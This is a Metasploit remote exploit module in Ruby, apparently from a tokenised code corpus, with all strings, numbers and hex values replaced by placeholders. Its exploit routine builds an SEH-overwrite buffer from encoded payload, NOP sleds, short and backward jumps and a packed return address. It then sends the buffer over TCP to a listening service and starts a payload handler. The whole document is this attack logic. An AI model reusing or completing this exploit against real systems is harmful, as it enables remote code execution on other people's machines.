require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , [ <str> , { <str> = > <str> , <str> = > <hex> , <str> = > <int> } ] , ] , <str> = > false , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def exploit connect print_status ( <str> target . name <str> ) if ( target [ <str> ] =~ <str> ) mal = Rex :: Text . pattern_create ( payload_space , Rex :: Text :: DefaultPatternSets ) print_status ( <str> ) else mal = payload . encoded + make_nops ( target [ <str> ] ) mal << Rex :: Arch :: X86 . jmp_short ( <int> ) + make_nops ( <int> ) + [ target . ret ] . pack ( <str> ) mal << Rex :: Arch :: X86 . jmp ( - ( mal . length + <int> ) ) end wakeup = [ <hex> ] . pack ( <str> ) [ <int> .. <int> ] + [ mal . length ] . pack ( <str> ) + mal len = [ wakeup . length ] . pack ( <str> ) sock . put ( len ) sock . put ( wakeup ) print_status ( <str> ) handler disconnect end end 
